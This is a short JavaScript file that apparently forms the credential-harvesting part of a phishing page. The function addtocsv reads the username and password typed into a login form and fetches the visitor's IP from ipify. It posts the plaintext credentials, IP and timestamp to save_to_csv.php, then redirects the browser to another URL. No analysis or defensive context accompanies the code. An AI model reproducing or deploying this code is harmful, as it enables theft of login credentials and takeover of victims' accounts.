async function selectIp() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip.toString();
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
}

async function displayIp() {
  const ip = await selectIp();
  console.log("Your IP address is:", ip);
  return ip;
}

async function addtocsv(type, url) {
  user = getE("usernamefi").value;
  if (user == "") {
    getE("usernamefi").style.borderColor = "red";
    return;
  } else {
    getE("usernamefi").style.borderColor = "green";
  }
  pass = getE("passwordfi").value;
  if (pass == "") {
    getE("passwordfi").style.borderColor = "red";
    return;
  } else {
    getE("passwordfi").style.borderColor = "green";
  }
  const ip = await displayIp();
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, "0");
  const day = String(now.getDate()).padStart(2, "0");
  const hours = String(now.getHours()).padStart(2, "0");
  const minutes = String(now.getMinutes()).padStart(2, "0");
  const formattedDateTime = `${year}-${month}-${day} ${hours}:${minutes}`;

  try {
    const response = await fetch("save_to_csv.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        ip,
        user,
        pass,
        datetime: formattedDateTime,
        type,
      }),
    });
    if (!response.ok) {
      throw new Error("Network response was not ok");
    }
    const result = await response.json();
    if (result.success) {
      console.log("Data saved successfully");
    } else {
      console.error("Failed to save data:", result.error);
    }
  } catch (error) {
    console.error("Error saving data:", error);
  }
  window.location.href = url;
}

function getE(x) {
  return document.getElementById(x);
}
